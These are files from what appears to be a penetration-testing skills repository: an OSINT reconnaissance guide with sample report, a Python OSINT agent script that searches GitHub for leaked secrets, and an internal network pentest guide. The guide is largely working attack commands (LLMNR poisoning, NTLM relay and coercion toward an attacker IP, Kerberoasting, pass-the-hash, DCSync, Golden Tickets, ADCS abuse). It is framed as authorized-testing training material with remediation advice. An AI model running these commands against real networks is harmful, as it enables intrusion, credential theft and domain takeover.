| **Passive Reconnaissance** | Information gathering without directly interacting with target systems, leaving no footprint in target logs |
| **Active Reconnaissance** | Information gathering that involves direct interaction with target systems (scanning, probing) and may be logged |
| **Certificate Transparency** | Public logs of TLS certificates issued by certificate authorities, queryable to discover subdomains and infrastructure |
| **Attack Surface** | The sum of all points where an unauthorized user can attempt to enter or extract data from an environment |
| **Google Dorking** | Using advanced Google search operators to find sensitive information indexed by search engines that was not intended to be public |
| **Shadow IT** | Technology systems and services deployed by employees or departments without the knowledge or approval of the IT department |

## Tools & Systems

- **Amass (OWASP)**: Comprehensive subdomain enumeration tool that combines passive sources, DNS brute-forcing, and certificate transparency log analysis
- **Shodan**: Internet-wide scanning database that indexes services, banners, and metadata for internet-connected devices, searchable by IP, domain, or organization
- **theHarvester**: OSINT tool for gathering emails, subdomains, hosts, employee names, and open ports from public sources
- **SpiderFoot**: Automated OSINT collection platform that queries 200+ data sources and correlates findings into a unified graph
- **Recon-ng**: Modular web reconnaissance framework with a database backend for organizing and cross-referencing discovered intelligence

## Common Scenarios

### Scenario: Pre-Engagement Reconnaissance for a Red Team Exercise

**Context**: A technology company has contracted a red team assessment. Before active testing begins, the team conducts passive OSINT to map the attack surface and identify potential entry points. The target is a SaaS company with 500 employees and a primary domain of techcorp.io.

**Approach**:
1. Enumerate 147 subdomains via Amass and crt.sh, including staging.techcorp.io, jenkins.techcorp.io, and vpn.techcorp.io
2. Shodan reveals a forgotten Elasticsearch instance on port 9200 with no authentication exposed to the internet
3. theHarvester collects 89 employee email addresses, revealing the format first.last@techcorp.io
4. GitHub search discovers a former developer's public repository containing a `.env` file with AWS access keys
5. LinkedIn analysis reveals the company uses Okta for SSO, Jira for project management, and AWS for hosting
6. Google dorking finds a directory listing on docs.techcorp.io exposing internal architecture diagrams
7. Compile all intelligence into a reconnaissance report that feeds directly into the threat modeling and attack planning phases

**Pitfalls**:
- Relying on a single subdomain enumeration tool and missing assets found by other tools using different data sources
- Failing to check cloud storage services (S3, Azure Blob, GCP) for publicly accessible buckets
- Not searching for credentials in public code repositories, which frequently yield immediate access
- Conducting active scanning (port scans, vulnerability scans) during what should be a passive-only phase

## Output Format

```
## External Reconnaissance Report - TechCorp.io

### Attack Surface Summary
- **Domains discovered**: 3 (techcorp.io, techcorp.com, techcorpapp.com)
- **Subdomains enumerated**: 147 unique subdomains across all domains
- **Unique IP addresses**: 34 IPs mapped across AWS us-east-1 and us-west-2
- **Email addresses collected**: 89 valid corporate email addresses
- **Exposed services**: 12 internet-facing services identified via Shodan/Censys

### Critical Findings

**1. Unauthenticated Elasticsearch Instance**
- Host: 52.xx.xx.xx:9200 (elastic.techcorp.io)
- Indexed data: Application logs containing user session tokens and PII
- Source: Shodan search "ssl.cert.subject.cn:techcorp.io"

**2. AWS Credentials in Public GitHub Repository**
- Repository: github.com/former-dev/techcorp-scripts
- File: .env containing AWS_ACCESS_KEY_ID and AWS_SECRET_ACCESS_KEY
- Status: Keys appear active (not tested - out of scope for passive recon)

**3. Directory Listing Exposing Internal Documents**
- URL: https://docs.techcorp.io/internal/
- Contents: Architecture diagrams, network topology, runbooks
- Source: Google dork "site:techcorp.io intitle:index.of"

### Recommendations
1. Immediately rotate the exposed AWS credentials and audit CloudTrail logs
2. Restrict Elasticsearch access to internal networks or add authentication
3. Disable directory listings on docs.techcorp.io and audit all web servers
4. Implement GitHub secret scanning across all organization repositories
```

===== END FILE =====


===== FILE: skills/conducting-external-reconnaissance-with-osint/LICENSE =====

                                 Apache License
                           Version 2.0, January 2004
                        http://www.apache.org/licenses/

   TERMS AND CONDITIONS FOR USE, REPRODUCTION, AND DISTRIBUTION

   1. Definitions.

      "License" shall mean the terms and conditions for use, reproduction,
      and distribution as defined by Sections 1 through 9 of this document.

      "Licensor" shall mean the copyright owner or entity authorized by
      the copyright owner that is granting the License.

      "Legal Entity" shall mean the union of the acting entity and all
      other entities that control, are controlled by, or are under common
      control with that entity. For the purposes of this definition,
      "control" means (i) the power, direct or indirect, to cause the
      direction or management of such entity, whether by contract or
      otherwise, or (ii) ownership of fifty percent (50%) or more of the
      outstanding shares, or (iii) beneficial ownership of such entity.

      "You" (or "Your") shall mean an individual or Legal Entity
      exercising permissions granted by this License.

      "Source" form shall mean the preferred form for making modifications,
      including but not limited to software source code, documentation
      source, and configuration files.

      "Object" form shall mean any form resulting from mechanical
      transformation or translation of a Source form, including but
      not limited to compiled object code, generated documentation,
      and conversions to other media types.

      "Work" shall mean the work of authorship, whether in Source or
      Object form, made available under the License, as indicated by a
      copyright notice that is included in or attached to the work
      (an example is provided in the Appendix below).

      "Derivative Works" shall mean any work, whether in Source or Object
      form, that is based on (or derived from) the Work and for which the
      editorial revisions, annotations, elaborations, or other modifications
      represent, as a whole, an original work of authorship. For the purposes
      of this License, Derivative Works shall not include works that remain
      separable from, or merely link (or bind by name) to the interfaces of,
      the Work and Derivative Works thereof.

      "Contribution" shall mean any work of authorship, including
      the original version of the Work and any modifications or additions
      to that Work or Derivative Works thereof, that is intentionally
      submitted to the Licensor for inclusion in the Work by the copyright owner
      or by an individual or Legal Entity authorized to submit on behalf of
      the copyright owner. For the purposes of this definition, "submitted"
      means any form of electronic, verbal, or written communication sent
      to the Licensor or its representatives, including but not limited to
      communication on electronic mailing lists, source code control systems,
      and issue tracking systems that are managed by, or on behalf of, the
      Licensor for the purpose of discussing and improving the Work, but
      excluding communication that is conspicuously marked or otherwise
      designated in writing by the copyright owner as "Not a Contribution."

      "Contributor" shall mean Licensor and any individual or Legal Entity
      on behalf of whom a Contribution has been received by the Licensor and
      subsequently incorporated within the Work.

   2. Grant of Copyright License. Subject to the terms and conditions of
      this License, each Contributor hereby grants to You a perpetual,
      worldwide, non-exclusive, no-charge, royalty-free, irrevocable
      copyright license to reproduce, prepare Derivative Works of,
      publicly display, publicly perform, sublicense, and distribute the
      Work and such Derivative Works in Source or Object form.

   3. Grant of Patent License. Subject to the terms and conditions of
      this License, each Contributor hereby grants to You a perpetual,
      worldwide, non-exclusive, no-charge, royalty-free, irrevocable
      (except as stated in this section) patent license to make, have made,
      use, offer to sell, sell, import, and otherwise transfer the Work,
      where such license applies only to those patent claims licensable
      by such Contributor that are necessarily infringed by their
      Contribution(s) alone or by combination of their Contribution(s)
      with the Work to which such Contribution(s) was submitted. If You
      institute patent litigation against any entity (including a
      cross-claim or counterclaim in a lawsuit) alleging that the Work
      or a Contribution incorporated within the Work constitutes direct
      or contributory patent infringement, then any patent licenses
      granted to You under this License for that Work shall terminate
      as of the date such litigation is filed.

   4. Redistribution. You may reproduce and distribute copies of the
      Work or Derivative Works thereof in any medium, with or without
      modifications, and in Source or Object form, provided that You
      meet the following conditions:

      (a) You must give any other recipients of the Work or
          Derivative Works a copy of this License; and

      (b) You must cause any modified files to carry prominent notices
          stating that You changed the files; and

      (c) You must retain, in the Source form of any Derivative Works
          that You distribute, all copyright, patent, trademark, and
          attribution notices from the Source form of the Work,
          excluding those notices that do not pertain to any part of
          the Derivative Works; and

      (d) If the Work includes a "NOTICE" text file as part of its
          distribution, then any Derivative Works that You distribute must
          include a readable copy of the attribution notices contained
          within such NOTICE file, excluding any notices that do not
          pertain to any part of the Derivative Works, in at least one
          of the following places: within a NOTICE text file distributed
          as part of the Derivative Works; within the Source form or
          documentation, if provided along with the Derivative Works; or,
          within a display generated by the Derivative Works, if and
          wherever such third-party notices normally appear. The contents
          of the NOTICE file are for informational purposes only and
          do not modify the License. You may add Your own attribution
          notices within Derivative Works that You distribute, alongside
          or as an addendum to the NOTICE text from the Work, provided
          that such additional attribution notices cannot be construed
          as modifying the License.

      You may add Your own copyright statement to Your modifications and
      may provide additional or different license terms and conditions
      for use, reproduction, or distribution of Your modifications, or
      for any such Derivative Works as a whole, provided Your use,
      reproduction, and distribution of the Work otherwise complies with
      the conditions stated in this License.

   5. Submission of Contributions. Unless You explicitly state otherwise,
      any Contribution intentionally submitted for inclusion in the Work
      by You to the Licensor shall be under the terms and conditions of
      this License, without any additional terms or conditions.
      Notwithstanding the above, nothing herein shall supersede or modify
      the terms of any separate license agreement you may have executed
      with Licensor regarding such Contributions.

   6. Trademarks. This License does not grant permission to use the trade
      names, trademarks, service marks, or product names of the Licensor,
      except as required for reasonable and customary use in describing the
      origin of the Work and reproducing the content of the NOTICE file.

   7. Disclaimer of Warranty. Unless required by applicable law or
      agreed to in writing, Licensor provides the Work (and each
      Contributor provides its Contributions) on an "AS IS" BASIS,
      WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or
      implied, including, without limitation, any warranties or conditions
      of TITLE, NON-INFRINGEMENT, MERCHANTABILITY, or FITNESS FOR A
      PARTICULAR PURPOSE. You are solely responsible for determining the
      appropriateness of using or redistributing the Work and assume any
      risks associated with Your exercise of permissions under this License.

   8. Limitation of Liability. In no event and under no legal theory,
      whether in tort (including negligence), contract, or otherwise,
      unless required by applicable law (such as deliberate and grossly
      negligent acts) or agreed to in writing, shall any Contributor be
      liable to You for damages, including any direct, indirect, special,
      incidental, or consequential damages of any character arising as a
      result of this License or out of the use or inability to use the
      Work (including but not limited to damages for loss of goodwill,
      work stoppage, computer failure or malfunction, or any and all
      other commercial damages or losses), even if such Contributor
      has been advised of the possibility of such damages.

   9. Accepting Warranty or Additional Liability. While redistributing
      the Work or Derivative Works thereof, You may choose to offer,
      and charge a fee for, acceptance of support, warranty, indemnity,
      or other liability obligations and/or rights consistent with this
      License. However, in accepting such obligations, You may act only
      on Your own behalf and on Your sole responsibility, not on behalf
      of any other Contributor, and only if You agree to indemnify,
      defend, and hold each Contributor harmless for any liability
      incurred by, or claims asserted against, such Contributor by reason
      of your accepting any such warranty or additional liability.

   END OF TERMS AND CONDITIONS

   APPENDIX: How to apply the Apache License to your work.

      To apply the Apache License to your work, attach the following
      boilerplate notice, with the fields enclosed by brackets "[]"
      replaced with your own identifying information. (Don't include
      the brackets!)  The text should be enclosed in the appropriate
      comment syntax for the file format. Please do not remove or change
      the license header comment from a contributed file except when
      necessary.

   Copyright 2026 mukul975

   Licensed under the Apache License, Version 2.0 (the "License");
   you may not use this file except in compliance with the License.
   You may obtain a copy of the License at

       http://www.apache.org/licenses/LICENSE-2.0

   Unless required by applicable law or agreed to in writing, software
   distributed under the License is distributed on an "AS IS" BASIS,
   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
   See the License for the specific language governing permissions and
   limitations under the License.

===== END FILE =====


===== FILE: skills/conducting-external-reconnaissance-with-osint/references/api-reference.md =====
# API Reference: External Reconnaissance OSINT Agent

## Overview

Maps an organization's external attack surface using passive OSINT: certificate transparency, DNS records, Shodan, email security checks, web technology fingerprinting, and GitHub leak detection. For authorized assessments only.

## Dependencies

| Package | Version | Purpose |
|---------|---------|---------|
| shodan | >=1.28 | Shodan API for host discovery |
| requests | >=2.28 | HTTP API calls |

## CLI Usage

```bash
python agent.py --domain example.com --org "Example Corp" --shodan-key <key> \
  --github-token <token> --output recon.json
```

## Key Functions

### `enumerate_subdomains_crtsh(domain)`
Discovers subdomains from certificate transparency logs via crt.sh JSON API.

### `enumerate_dns_records(domain)`
Queries A, AAAA, MX, NS, TXT, CNAME, SOA records using Google DNS-over-HTTPS API.

### `shodan_org_search(api_key, org_name, max_results)`
Searches Shodan for hosts belonging to a named organization.

### `check_email_security(domain)`
Checks for SPF and DMARC DNS records to assess email security posture.

### `check_web_technologies(domain)`
Identifies web server technologies from HTTP response headers (Server, X-Powered-By).

### `search_github_leaks(domain, github_token)`
Searches GitHub code for leaked passwords, API keys, and secrets related to the target.

### `generate_recon_report(...)`
Consolidates all OSINT findings into a structured JSON report.

## External APIs Used

| API | Endpoint | Auth | Purpose |
|-----|----------|------|---------|
| crt.sh | `https://crt.sh/?q=...&output=json` | None | Certificate transparency |
| Google DNS | `https://dns.google/resolve` | None | DNS record lookup |
| Shodan | `api.shodan.io` | API key | Host/service discovery |
| GitHub | `https://api.github.com/search/code` | Token | Code leak search |

===== END FILE =====


===== FILE: skills/conducting-external-reconnaissance-with-osint/scripts/agent.py =====
#!/usr/bin/env python3
# For authorized penetration testing and lab environments only
"""External Reconnaissance Agent - Maps organization attack surface using passive OSINT."""

import json
import logging
import argparse
from datetime import datetime

import requests
import shodan

logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")
logger = logging.getLogger(__name__)


def enumerate_subdomains_crtsh(domain):
    """Discover subdomains via certificate transparency logs."""
    url = f"https://crt.sh/?q=%.{domain}&output=json"
    resp = requests.get(url, timeout=60)
    subdomains = set()
    if resp.status_code == 200:
        for entry in resp.json():
            for name in entry.get("name_value", "").split("\n"):
                name = name.strip().lower()
                if name and "*" not in name and domain in name:
                    subdomains.add(name)
    logger.info("crt.sh: %d subdomains for %s", len(subdomains), domain)
    return sorted(subdomains)


def enumerate_dns_records(domain):
    """Query public DNS records for a domain using DNS-over-HTTPS."""
    record_types = ["A", "AAAA", "MX", "NS", "TXT", "CNAME", "SOA"]
    records = {}
    for rtype in record_types:
        url = f"https://dns.google/resolve?name={domain}&type={rtype}"
        resp = requests.get(url, timeout=10)
        if resp.status_code == 200:
            data = resp.json()
            answers = data.get("Answer", [])
            if answers:
                records[rtype] = [a.get("data", "") for a in answers]
    logger.info("DNS records collected for %s: %s", domain, list(records.keys()))
    return records


def shodan_org_search(api_key, org_name, max_results=50):
    """Search Shodan for hosts belonging to an organization."""
    api = shodan.Shodan(api_key)
    results = api.search(f'org:"{org_name}"', limit=max_results)
    hosts = []
    for match in results["matches"]:
        hosts.append({
            "ip": match["ip_str"],
            "port": match["port"],
            "product": match.get("product", ""),
            "version": match.get("version", ""),
            "os": match.get("os", ""),
            "hostnames": match.get("hostnames", []),
        })
    logger.info("Shodan: %d hosts for org '%s'", len(hosts), org_name)
    return hosts


def check_email_security(domain):
    """Check SPF, DKIM, and DMARC records for email security posture."""
    email_security = {}
    for prefix, rtype in [("", "TXT"), ("_dmarc.", "TXT")]:
        url = f"https://dns.google/resolve?name={prefix}{domain}&type={rtype}"
        resp = requests.get(url, timeout=10)
        if resp.status_code == 200:
            answers = resp.json().get("Answer", [])
            for a in answers:
                data = a.get("data", "")
                if "v=spf1" in data:
                    email_security["spf"] = data
                elif "v=DMARC1" in data:
                    email_security["dmarc"] = data
    email_security["spf_present"] = "spf" in email_security
    email_security["dmarc_present"] = "dmarc" in email_security
    logger.info("Email security for %s: SPF=%s DMARC=%s",
                domain, email_security["spf_present"], email_security["dmarc_present"])
    return email_security


def search_breach_data(account, api_key):
    """Search Have I Been Pwned v3 for breaches affecting an account.

    Requires a paid HIBP API key passed in the `hibp-api-key` header. The v3
    breachedaccount endpoint returns 200 with a breach list, 404 when the
    account has no breaches, 401 for a missing/invalid key, and 429 on rate
    limiting (Retry-After header indicates the back-off in seconds).
    """
    if not api_key:
        logger.warning("HIBP API key not provided; skipping breach lookup")
        return []
    url = f"https://haveibeenpwned.com/api/v3/breachedaccount/{account}"
    headers = {"hibp-api-key": api_key, "user-agent": "OSINT-Recon-Agent"}
    params = {"truncateResponse": "false"}
    try:
        resp = requests.get(url, headers=headers, params=params, timeout=15)
        if resp.status_code == 200:
            breaches = resp.json()
            logger.info("HIBP: %d breach(es) for %s", len(breaches), account)
            return breaches
        if resp.status_code == 404:
            logger.info("HIBP: no breaches found for %s", account)
            return []
        if resp.status_code == 401:
            logger.error("HIBP: unauthorized - invalid or missing API key")
        elif resp.status_code == 429:
            logger.error("HIBP: rate limited, retry after %s seconds",
                         resp.headers.get("Retry-After", "unknown"))
        else:
            logger.error("HIBP: unexpected status %d", resp.status_code)
    except requests.RequestException as e:
        logger.error("HIBP request failed: %s", e)
    return []


def check_web_technologies(domain):
    """Identify web technologies via HTTP response headers."""
    technologies = {}
    try:
        resp = requests.get(f"https://{domain}", timeout=10, allow_redirects=True, verify=False)
        headers = resp.headers
        tech_headers = {
            "Server": headers.get("Server", ""),
            "X-Powered-By": headers.get("X-Powered-By", ""),
            "X-AspNet-Version": headers.get("X-AspNet-Version", ""),
            "X-Generator": headers.get("X-Generator", ""),
        }
        technologies = {k: v for k, v in tech_headers.items() if v}
        technologies["status_code"] = resp.status_code
        technologies["final_url"] = resp.url
    except requests.RequestException as e:
        technologies["error"] = str(e)
    return technologies


def search_github_leaks(domain, github_token=None):
    """Search GitHub for leaked credentials related to the target domain."""
    headers = {"Accept": "application/vnd.github.v3+json"}
    if github_token:
        headers["Authorization"] = f"token {github_token}"
    queries = [f'"{domain}" password', f'"{domain}" api_key', f'"{domain}" secret']
    all_results = []
    for query in queries:
        resp = requests.get(
            "https://api.github.com/search/code",
            headers=headers, params={"q": query, "per_page": 10}, timeout=15
        )
        if resp.status_code == 200:
            items = resp.json().get("items", [])
            for item in items:
                all_results.append({
                    "repo": item["repository"]["full_name"],
                    "path": item["path"],
                    "url": item["html_url"],
                    "query": query,
                })
    logger.info("GitHub: %d potential leaks for %s", len(all_results), domain)
    return all_results


def generate_recon_report(domain, subdomains, dns, shodan_hosts, email_sec,
                          technologies, github_leaks, breaches):
    """Generate external reconnaissance report."""
    report = {
        "target": domain,
        "timestamp": datetime.utcnow().isoformat(),
        "subdomains": {"count": len(subdomains), "list": subdomains},
        "dns_records": dns,
        "shodan_hosts": {"count": len(shodan_hosts), "hosts": shodan_hosts},
        "email_security": email_sec,
        "web_technologies": technologies,
        "github_leaks": github_leaks,
        "breaches": {"count": len(breaches), "list": breaches},
    }
    print(f"RECON REPORT - {domain}")
    print(f"Subdomains: {len(subdomains)}, Shodan hosts: {len(shodan_hosts)}, "
          f"GitHub leaks: {len(github_leaks)}, Breaches: {len(breaches)}")
    return report


def main():
    parser = argparse.ArgumentParser(description="External Reconnaissance OSINT Agent")
    parser.add_argument("--domain", required=True, help="Target domain")
    parser.add_argument("--org", help="Organization name for Shodan search")
    parser.add_argument("--shodan-key", help="Shodan API key")
    parser.add_argument("--github-token", help="GitHub token for code search")
    parser.add_argument("--hibp-key", help="Have I Been Pwned API key "
                        "(falls back to HIBP_API_KEY env var)")
    parser.add_argument("--breach-account", help="Account/email to check "
                        "against Have I Been Pwned breaches")
    parser.add_argument("--output", default="recon_report.json")
    args = parser.parse_args()

    subdomains = enumerate_subdomains_crtsh(args.domain)
    dns = enumerate_dns_records(args.domain)
    email_sec = check_email_security(args.domain)
    technologies = check_web_technologies(args.domain)

    shodan_hosts = []
    if args.shodan_key and args.org:
        shodan_hosts = shodan_org_search(args.shodan_key, args.org)

    github_leaks = search_github_leaks(args.domain, args.github_token) if args.github_token else []

    breaches = []
    if args.breach_account:
        hibp_key = args.hibp_key or os.environ.get("HIBP_API_KEY")
        breaches = search_breach_data(args.breach_account, hibp_key)

    report = generate_recon_report(
        args.domain, subdomains, dns, shodan_hosts, email_sec,
        technologies, github_leaks, breaches
    )
    with open(args.output, "w") as f:
        json.dump(report, f, indent=2)
    logger.info("Recon report saved to %s", args.output)


if __name__ == "__main__":
    main()

===== END FILE =====


===== FILE: skills/conducting-internal-network-penetration-test/SKILL.md =====
---
name: conducting-internal-network-penetration-test
description: Execute an internal network penetration test simulating an insider threat
  or post-breach attacker to identify lateral movement paths, privilege escalation
  vectors, and sensitive data exposure within the corporate network.
domain: cybersecurity
subdomain: penetration-testing
tags:
- internal-pentest
- lateral-movement
- privilege-escalation
- Responder
- Impacket
- assumed-breach
- network-security
version: '1.0'
author: mahipal
license: Apache-2.0
d3fend_techniques:
- Application Protocol Command Analysis
- Network Isolation
- Network Traffic Analysis
- Client-server Payload Profiling
- Network Traffic Community Deviation
nist_csf:
- ID.RA-01
- ID.RA-06
- GV.OV-02
- DE.AE-07
mitre_attack:
- T1046
- T1018
- T1021
- T1210
---

# Conducting Internal Network Penetration Test

## Overview

An internal network penetration test simulates an attacker who has already gained access to the internal network or a malicious insider. The tester operates from an "assumed breach" position — typically a standard domain workstation or network jack — and attempts lateral movement, privilege escalation, credential harvesting, and data exfiltration to determine the blast radius of a compromised endpoint.


## When to Use

- When conducting security assessments that involve conducting internal network penetration test
- When following incident response procedures for related security events
- When performing scheduled security testing or auditing activities
- When validating security controls through hands-on testing

## Prerequisites

- Signed Rules of Engagement with internal network scope
- Network access: physical Ethernet drop or VPN connection to internal VLAN
- Standard domain user credentials (assumed breach model) or unauthenticated access
- Testing laptop with Kali Linux, Impacket, Responder, BloodHound
- Coordination with IT/SOC for monitoring and emergency contacts


> **Legal Notice:** This skill is for authorized security testing and educational purposes only. Unauthorized use against systems you do not own or have written permission to test is illegal and may violate computer fraud laws.

## Phase 1 — Network Discovery and Enumeration

### Initial Network Reconnaissance

```bash
# Identify your own network position
ip addr show
ip route show
cat /etc/resolv.conf

# ARP scan for live hosts on local subnet
arp-scan --localnet --interface eth0

# Nmap host discovery across internal ranges
nmap -sn 10.0.0.0/8 --exclude 10.0.0.1 -oG internal_hosts.gnmap
nmap -sn 172.16.0.0/12 -oG internal_hosts_172.gnmap
nmap -sn 192.168.0.0/16 -oG internal_hosts_192.gnmap

# Extract live hosts
grep "Status: Up" internal_hosts.gnmap | awk '{print $2}' > live_hosts.txt

# Port scan live hosts — top 1000 ports
nmap -sS -sV -T4 -iL live_hosts.txt -oA internal_tcp_scan

# Service-specific scans
nmap -p 445 --open -iL live_hosts.txt -oG smb_hosts.gnmap
nmap -p 3389 --open -iL live_hosts.txt -oG rdp_hosts.gnmap
nmap -p 22 --open -iL live_hosts.txt -oG ssh_hosts.gnmap
nmap -p 1433,3306,5432,1521,27017 --open -iL live_hosts.txt -oG db_hosts.gnmap
```

### Active Directory Enumeration

```bash
# Enumerate domain information with domain credentials
# Using CrackMapExec / NetExec
netexec smb 10.0.0.0/24 -u 'testuser' -p 'Password123' --shares
netexec smb 10.0.0.0/24 -u 'testuser' -p 'Password123' --users
netexec smb 10.0.0.0/24 -u 'testuser' -p 'Password123' --groups

# LDAP enumeration
ldapsearch -x -H ldap://10.0.0.5 -D "testuser@corp.local" -w "Password123" \
  -b "DC=corp,DC=local" "(objectClass=user)" sAMAccountName memberOf

# Enumerate Group Policy Objects
netexec smb 10.0.0.5 -u 'testuser' -p 'Password123' --gpp-passwords
netexec smb 10.0.0.5 -u 'testuser' -p 'Password123' --lsa

# BloodHound data collection
bloodhound-python -u 'testuser' -p 'Password123' -d corp.local -ns 10.0.0.5 -c all
# Import JSON files into BloodHound GUI for attack path analysis

# Enum4linux-ng for legacy enumeration
enum4linux-ng -A 10.0.0.5 -u 'testuser' -p 'Password123'
```

### Network Service Enumeration

```bash
# SMB share enumeration
smbclient -L //10.0.0.10 -U 'testuser%Password123'
smbmap -H 10.0.0.10 -u 'testuser' -p 'Password123' -R

# SNMP enumeration
snmpwalk -v2c -c public 10.0.0.1

# DNS zone transfer attempt
dig axfr corp.local @10.0.0.5

# NFS enumeration
showmount -e 10.0.0.15

# MSSQL enumeration
impacket-mssqlclient 'corp.local/testuser:Password123@10.0.0.20' -windows-auth
```

## Phase 2 — Credential Attacks

### Network Credential Capture

```bash
# Responder — LLMNR/NBT-NS/mDNS poisoning
sudo responder -I eth0 -dwPv

# Capture NTLMv2 hashes from Responder logs
cat /usr/share/responder/logs/NTLMv2-*.txt

# mitm6 — IPv6 DNS takeover
sudo mitm6 -d corp.local

# ntlmrelayx — relay captured credentials
impacket-ntlmrelayx -tf smb_targets.txt -smb2support -socks

# PetitPotam — coerce NTLM authentication
python3 PetitPotam.py -u 'testuser' -p 'Password123' -d corp.local \
  attacker_ip 10.0.0.5
```

### Password Attacks

```bash
# Crack captured NTLMv2 hashes
hashcat -m 5600 ntlmv2_hashes.txt /usr/share/wordlists/rockyou.txt \
  -r /usr/share/hashcat/rules/best64.rule

# Password spraying (careful with lockout policies)
netexec smb 10.0.0.5 -u users.txt -p 'Spring2025!' --no-bruteforce
netexec smb 10.0.0.5 -u users.txt -p 'Company2025!' --no-bruteforce

# Kerberoasting — target service accounts
impacket-GetUserSPNs 'corp.local/testuser:Password123' -dc-ip 10.0.0.5 \
  -outputfile kerberoast_hashes.txt
hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt

# AS-REP Roasting — target accounts without pre-auth
impacket-GetNPUsers 'corp.local/' -usersfile users.txt -dc-ip 10.0.0.5 \
  -outputfile asrep_hashes.txt
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt
```

## Phase 3 — Exploitation and Lateral Movement

### Lateral Movement Techniques

```bash
# Pass-the-Hash with Impacket
impacket-psexec 'corp.local/admin@10.0.0.30' -hashes :aad3b435b51404eeaad3b435b51404ee:e02bc503339d51f71d913c245d35b50b

# WMI execution
impacket-wmiexec 'corp.local/admin:AdminPass123@10.0.0.30'

# Evil-WinRM for PowerShell remoting
evil-winrm -i 10.0.0.30 -u admin -p 'AdminPass123'

# SMBExec
impacket-smbexec 'corp.local/admin:AdminPass123@10.0.0.30'

# RDP access
xfreerdp /v:10.0.0.30 /u:admin /p:'AdminPass123' /cert-ignore /dynamic-resolution

# SSH pivoting
ssh -D 9050 user@10.0.0.40
proxychains nmap -sT -p 80,443,445,3389 10.10.0.0/24
```

### Privilege Escalation

```bash
# Windows privilege escalation
# Check for local admin via token impersonation
meterpreter> getsystem
meterpreter> run post/multi/recon/local_exploit_suggester

# PowerShell-based privesc checks
# Run PowerUp
powershell -ep bypass -c "Import-Module .\PowerUp.ps1; Invoke-AllChecks"

# Check for unquoted service paths
wmic service get name,pathname,startmode | findstr /i /v "C:\Windows" | findstr /i /v """

# Linux privilege escalation
./linpeas.sh
sudo -l
find / -perm -4000 -type f 2>/dev/null
cat /etc/crontab
```

### Domain Escalation

```bash
# DCSync attack (requires replication rights)
impacket-secretsdump 'corp.local/domainadmin:DaPass123@10.0.0.5' -just-dc

# Golden Ticket attack
impacket-ticketer -nthash <krbtgt_hash> -domain-sid S-1-5-21-... -domain corp.local administrator

# Silver Ticket attack
impacket-ticketer -nthash <service_hash> -domain-sid S-1-5-21-... \
  -domain corp.local -spn MSSQL/db01.corp.local administrator

# ADCS exploitation (Certifried, ESC1-ESC8)
certipy find -u 'testuser@corp.local' -p 'Password123' -dc-ip 10.0.0.5
certipy req -u 'testuser@corp.local' -p 'Password123' -target ca01.corp.local \
  -template VulnerableTemplate -ca CORP-CA -upn administrator@corp.local
```

## Phase 4 — Data Access and Impact Demonstration

```bash
# Access sensitive file shares
smbclient //10.0.0.10/Finance -U 'domainadmin%DaPass123'
> dir
> get Q4_Financial_Report.xlsx

# Database access
impacket-mssqlclient 'sa:DbPassword123@10.0.0.20'
SQL> SELECT name FROM sys.databases;
SQL> SELECT TOP 10 * FROM customers;

# Extract proof of access (DO NOT exfiltrate real data)
echo "PENTEST-PROOF-INTERNAL-$(date +%Y%m%d)" > /tmp/proof.txt

# Document access chain
# Initial Access -> Responder -> NTLMv2 crack -> Lateral to WS01
# -> Local admin -> Mimikatz -> DA creds -> DCSync -> Full domain compromise
```

## Phase 5 — Reporting

### Attack Path Documentation

```
Attack Path 1: Domain Compromise via LLMNR Poisoning
  Step 1: LLMNR/NBT-NS poisoning captured NTLMv2 hash (T1557.001)
  Step 2: Hash cracked offline — user: jsmith, password: Welcome2025!
  Step 3: jsmith had local admin on WS042 — lateral movement via PsExec (T1021.002)
  Step 4: Mimikatz extracted DA credentials from WS042 memory (T1003.001)
  Step 5: DCSync with DA credentials — all domain hashes extracted (T1003.006)
  Impact: Complete domain compromise from unauthenticated network position
```

### Findings Severity Matrix

| Finding | CVSS | MITRE ATT&CK | Remediation |
|---------|------|---------------|-------------|
| LLMNR/NBT-NS poisoning | 8.1 | T1557.001 | Disable LLMNR/NBT-NS via GPO |
| Kerberoastable service accounts | 7.5 | T1558.003 | Use gMSA, 25+ char passwords |
| Local admin reuse | 8.4 | T1078 | Deploy LAPS, unique local admin passwords |
| Weak domain passwords | 7.2 | T1110 | Enforce 14+ char minimum, blacklist common passwords |
| Unrestricted DCSync | 9.8 | T1003.006 | Audit replication rights, implement tiered admin model |

## Tools Reference

| Tool | Purpose |
|------|---------|
| Responder | LLMNR/NBT-NS/mDNS poisoning |
| Impacket | AD attack suite (secretsdump, psexec, wmiexec, etc.) |
| BloodHound | AD attack path visualization |
| NetExec (CrackMapExec) | Network service enumeration and spraying |
| Evil-WinRM | PowerShell remoting client |
| Certipy | AD Certificate Services exploitation |
| Mimikatz | Windows credential extraction |
| Hashcat | Password hash cracking |
| Nmap | Network scanning and enumeration |
| LinPEAS/WinPEAS | Privilege escalation enumeration |

## References

- Cobalt Internal Network Pentesting Methodology: https://docs.cobalt.io/methodologies/internal-network/
- MITRE ATT&CK Enterprise: https://attack.mitre.org/matrices/enterprise/
- PTES: http://www.pentest-standard.org/
- Impacket: https://github.com/fortra/impacket
- BloodHound: https://github.com/BloodHoundAD/BloodHound

===== END FILE =====


===== FILE: skills/conducting-internal-network-penetration-test/LICENSE =====

                                 Apache License
                           Version 2.0, January 2004
                        http://www.apache.org/licenses/

   TERMS AND CONDITIONS FOR USE, REPRODUCTION, AND DISTRIBUTION

   1. Definitions.

      "License" shall mean the terms and conditions for use, reproduction,
      and distribution as defined by Sections 1 through 9 of this document.

      "Licensor" shall mean the copyright owner or entity authorized by
      the copyright owner that is granting the License.

      "Legal Entity" shall mean the union of the acting entity and all
      other entities that control, are controlled by, or are under common
      control with that entity. For the purposes of this definition,
      "control" means (i) the power, direct or indirect, to cause the
      direction or management of such entity, whether by contract or
      otherwise, or (ii) ownership of fifty percent (50%) or more of the
      outstanding shares, or (iii) beneficial ownership of such entity.

      "You" (or "Your") shall mean an individual or Legal Entity
      exercising permissions granted by this License.

      "Source" form shall mean the preferred form for making modifications,
      including but not limited to software source code, documentation
      source, and configuration files.

      "Object" form shall mean any form resulting from mechanical
      transformation or translation of a Source form, including but
      not limited to compiled object code, generated documentation,
      and conversions to other media types.

